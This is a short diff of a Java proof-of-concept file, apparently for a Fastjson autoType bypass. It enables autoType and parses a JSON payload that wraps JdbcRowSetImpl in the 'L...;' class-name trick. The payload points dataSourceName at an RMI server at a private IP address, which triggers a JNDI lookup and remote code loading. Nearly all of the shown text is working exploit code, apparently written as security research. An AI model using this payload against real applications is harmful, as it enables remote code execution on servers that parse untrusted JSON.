@@ -8,7 +8,7 @@ public class Bypass_1241_PoC {
         // First, we should manually set autoTypeSupport
         ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
         // And then, just put `L` before and `;` after :)
-        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://192.168.37.134:1099/j1dse2\", \"autoCommit\":true}";
+        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://192.168.37.134:1099/fwxpdq\", \"autoCommit\":true}";
         JSON.parse(payload);
         /*
 In TypeUtil#loadClass:
